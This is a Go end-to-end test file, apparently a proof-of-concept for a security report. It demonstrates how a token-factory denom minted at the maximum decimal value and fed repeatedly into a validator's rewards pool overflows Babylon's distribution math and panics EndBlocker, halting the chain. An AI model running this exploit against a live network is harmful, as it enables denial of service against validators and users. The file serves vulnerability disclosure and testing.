package e2e

/*
NOTE: This test suite has been updated to more closely match configuration for Mainnet.
The min commission rate is now set to 3% instead of 0% for all validators. To accomodate the deducted commmission, we have to fund the validator rewards an additional time to make up for the deducted commission. This will get the
cumulative rewards ratio close enough to MAX_INT_256 to trigger the overflow on slashing.
NOTE: An additional test TestOverflowNoSlashing is added to demonstrate how exploit can be done in a way that's unique to Babylon. And it doesn't require slashing or validator to be in active set.
*/

import (
	"fmt"
	"math/big"
	"math/rand"
	"strings"
	"testing"
	"time"

	"cosmossdk.io/math"
	"github.com/babylonlabs-io/babylon/v3/test/e2e/configurer"
	"github.com/babylonlabs-io/babylon/v3/testutil/datagen"
	sdk "github.com/cosmos/cosmos-sdk/types"
	"github.com/test-go/testify/require"

	"github.com/stretchr/testify/suite"
)

const (
	LegacyDecMaxValue = "115792089237316195423570985008687907853269984665640564039457584007913129639935"
	errIntOverflow    = "recovered: integer overflow"
)

type MathOverflowTest struct {
	suite.Suite

	r           *rand.Rand
	configurer  configurer.Configurer
	valAccAddrA string
	valAccAddrB string
}

func (s *MathOverflowTest) SetupSuite() {
	s.T().Log("setting up PoC test suite...")
	var err error

	s.r = rand.New(rand.NewSource(time.Now().Unix()))

	// s.configurer, err = configurer.NewIBCTransferConfigurer(s.T(), true)
	s.configurer, err = configurer.NewBabylonConfigurer(s.T(), true)

	s.Require().NoError(err)

	err = s.configurer.ConfigureChains()
	s.Require().NoError(err)

	err = s.configurer.RunSetup()
	s.Require().NoError(err)
}

func (s *MathOverflowTest) TearDownSuite() {
	err := s.configurer.ClearResources()
	if err != nil {
		s.T().Logf("error to clear resources %s", err.Error())
	}
}

/*
This test is a slight modification of the original test that shows how Babylon
can be exploited in unique way with the distribution overflow. A couple of differences from original test:
1. Does not require slashing to occur
2. Validator does not have to be in active set
3. Uses panic caused by delegation action, which is executed in epoching.EndBlocker
*/
func (s *MathOverflowTest) TestOverflowNoSlashing() {
	chainA := s.configurer.GetChainConfig(0)

	nA2, err := chainA.GetNodeAtIndex(2)
	s.NoError(err)

	senderChainA := nA2.KeysAdd("sender-chain-a")

	nA2.BankSendFromNode(senderChainA, "10000000ubbn")
	nA2.WaitForNextBlock()

	customDenomName := datagen.GenRandomHexStr(s.r, 10)
	s.T().Logf("Creating custom denom: %s", customDenomName)
	fullDenomName := fmt.Sprintf("factory/%s/%s", senderChainA, customDenomName)

	nA2.CreateDenom(senderChainA, customDenomName)
	nA2.WaitForNextBlock()

	nA0, err := chainA.GetNodeAtIndex(0)
	s.NoError(err)

	rewardsAmount := LegacyDecMaxValue + fullDenomName
	nA0ValAddr := sdk.ValAddress(sdk.MustAccAddressFromBech32(nA0.PublicAddress))

	for {
		mintDenomTxHash := nA2.MintDenom(senderChainA, LegacyDecMaxValue, fullDenomName)
		nA2.WaitForNextBlocks(2)
		tx, _ := nA2.QueryTx(mintDenomTxHash)
		if strings.Contains(tx.RawLog, errIntOverflow) {
			break
		}

		fundValTxHash := nA2.FundValidatorRewardsPool(senderChainA, nA0ValAddr.String(), rewardsAmount)
		nA0.WaitForNextBlock()
		tx, _ = nA2.QueryTx(fundValTxHash)
		if strings.Contains(tx.RawLog, errIntOverflow) {
			break
		}
	}

	for {
		valBalances, err := nA2.QueryBalances(nA0.PublicAddress)
		s.NoError(err)
		amountTokenFactory := valBalances.AmountOf(fullDenomName)

		nA0.WithdrawValidatorRewards(nA0.WalletName, nA0ValAddr.String(), "--commission")
		nA0.WaitForNextBlock()

		nA0.Delegate(nA0.WalletName, nA0ValAddr.String(), "1ubbn")
		nA0.WaitForNextBlock()

		if amountTokenFactory.LTE(math.OneInt()) {
			continue
		}

		rewards := sdk.NewCoins(sdk.NewCoin(fullDenomName, amountTokenFactory))
		fundValTxHash := nA0.FundValidatorRewardsPool(nA0.WalletName, nA0ValAddr.String(), rewards.String())
		nA0.WaitForNextBlock()
		tx, _ := nA2.QueryTx(fundValTxHash)
		if strings.Contains(tx.RawLog, errIntOverflow) {
			break
		}
	}

	nA0.WaitForNextBlocks(1000)
}

func MaxValueLegacyDec() math.LegacyDec {
	precisionReuse := new(big.Int).Exp(big.NewInt(10), big.NewInt(60), nil)

	tmp := new(big.Int).Exp(big.NewInt(2), big.NewInt(256), nil)
	tmp = new(big.Int).Sub(new(big.Int).Mul(tmp, precisionReuse), big.NewInt(1))
	return math.LegacyNewDecFromBigInt(tmp)
}

func TestMaxValueDec(t *testing.T) {
	// strVal := MaxValueLegacyDec().Sub(math.LegacyOneDec()).TruncateDec().String()

	x := math.LegacyNewDec(1000000000000000000)
	for {
		strV := fmt.Sprintf("%d", x)
		value, err := math.LegacyNewDecFromStr(strV)
		if err != nil {
			break
		}
		x = x.Add(math.LegacyNewDec(1000000000000000000))
		require.NoError(t, err)
		require.NotNil(t, value)
	}

}

func TestMaxValueDec2(t *testing.T) {
	// strVal := MaxValueLegacyDec().Sub(math.LegacyOneDec()).TruncateDec().String()

	// str := "109999999999999999999999999999999999999999999999999999999999999999999999999999"
	str := "119999999999999999999999999999999999999999999999999999999999999999999999999999"
	for {
		value, err := math.LegacyNewDecFromStr(str)
		if err != nil {
			break
		}
		str = str + "0"
		require.NoError(t, err)
		require.NotNil(t, value)
	}

}
